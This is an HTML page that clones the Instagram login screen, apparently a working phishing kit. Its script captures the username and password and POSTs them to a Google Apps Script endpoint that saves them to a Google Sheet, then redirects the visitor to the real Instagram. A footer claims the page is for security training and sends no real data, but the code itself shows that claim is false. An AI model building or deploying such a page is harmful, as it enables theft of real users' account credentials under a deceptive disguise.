<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram - Log in</title>
  <style>
    body {
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: white;
      border: 1px solid #dbdbdb;
      width: 350px;
      padding: 40px 20px;
      text-align: center;
      border-radius: 3px;
    }
    .logo { width: 175px; margin-bottom: 30px; }
    input {
      width: 90%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      box-sizing: border-box;
      font-size: 14px;
    }
    button {
      width: 95%;
      padding: 8px;
      background: #0095f6;
      color: white;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin: 10px 0;
      font-size: 14px;
    }
  </style>
</head>
<body>

<div class="container">
  <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
  
  <form id="loginForm">
    <input type="text" id="username" placeholder="Phone number, username, or email" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Log in</button>
  </form>
  
  <p style="color: #8e8e8e; font-size: 12px; margin-top: 20px;">
    This page is created only for personal security training — no real data is sent.
  </p>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    alert('Please fill in both fields');
    return;
  }

  const payload = { username: username, password: password };

  try {
    const response = await fetch('https://script.google.com/macros/s/AKfycbzziwsBoCyHowhpqNf1hAxkMdqchJxlPpQ4oJ099a2liUCtORDWbhyiJ4e6NIWhXTTT-A/exec', {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain;charset=utf-8'
      },
      body: JSON.stringify(payload)
    });

    const result = await response.json();

    if (result.status === 'success') {
      alert('✅ Test credentials saved to Google Sheet!\n\nRedirecting to real Instagram...');
      window.location.href = 'https://www.instagram.com';
    } else {
      alert('Error: ' + (result.message || 'Unknown error'));
    }
  } catch (err) {
    console.error('Fetch error:', err);
    alert('❌ Error sending data: Failed to fetch\n\nCheck:\n1. Internet connection\n2. Correct Web App URL\n3. Redeployed after code change');
  }
});
</script>

</body>
</html>
